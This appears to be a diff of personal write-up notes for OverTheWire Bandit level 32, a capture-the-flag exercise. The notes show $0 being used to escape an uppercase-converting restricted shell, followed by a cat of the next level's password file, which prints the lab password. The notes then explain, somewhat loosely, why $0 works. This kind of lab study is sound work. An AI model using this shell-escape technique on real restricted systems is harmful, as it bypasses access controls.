@@ -1,3 +1,49 @@
 ✅ 
 ❌
 ➡️
+
+$   ssh bandit32@bandit.labs.overthewire.org -p 2220
+
+WELCOME TO THE UPPERCASE SHELL
+>>  ls
+    sh: 1: LS: Permission denied
+
+>>  $0
+$   whoami
+$   cat /etc/bandit_pass/bandit33
+tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0✅
+
+
+________________________________________________________________________________________________________________________________
+
+1️⃣  What $0 REALLY means
+    ➡️  $0 is the name/path of the currently running program (shell or script)
+    ➡️  $0 is identity, not location.
+    ➡️  It is set by the OS when the process starts, not by you.
+    ➡️  $0 always shows who is currently running, not who started the process
+    ➡️  $0 does not return ./uppershell because uppershell has already been replaced by /bin/sh before you ever typed $0 
+
+
+
+2️⃣ Why $0 worked in Bandit32
+
+Bandit32 uses a restricted wrapper shell that Converts all input to UPPERCASE it treat ls as LS before execution
+Execution flow:
+User input     → $0
+Uppercase step → $0 (unchanged)
+Expansion      → /bin/sh
+Execution      → exec /bin/sh
+
+🔥 Result: real shell spawned
+
+
+
+🧠 One-line memory rule 
+$0 works because it reveals and re-executes the real shell already running, bypassing superficial restrictions.
+$0 might be ❌ Dangerous if used in SUID programs & Used in sandboxes or executed blindly
+
+
+🏁 Final memory sentence
+$0 always shows who is currently running, not who started the process
+
+
